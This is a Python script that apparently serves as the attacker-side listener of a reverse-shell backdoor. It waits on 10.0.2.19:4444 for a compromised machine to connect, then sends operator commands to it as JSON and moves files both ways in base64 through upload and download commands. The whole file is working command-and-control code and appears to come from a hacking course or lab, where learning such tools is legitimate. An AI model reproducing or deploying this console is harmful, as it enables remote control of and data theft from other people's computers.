#!/usr/bin/python
import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for connections.")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection from {address}.")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        #print(f"json_data_send is {json_data}")
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        chuck_json_data_str = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                json_data_str = json_data.decode()
                chuck_json_data_str = chuck_json_data_str + json_data_str
                #print(f"json_data_recieve is {json_data_str}")
                return json.loads(chuck_json_data_str)
            except json.decoder.JSONDecodeError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload" and len(command) > 1:
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())
                result = self.execute_remotely(command)
                if command[0] == "download" and len(command) > 1 and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)

my_listener = Listener("10.0.2.19", 4444)
my_listener.run()
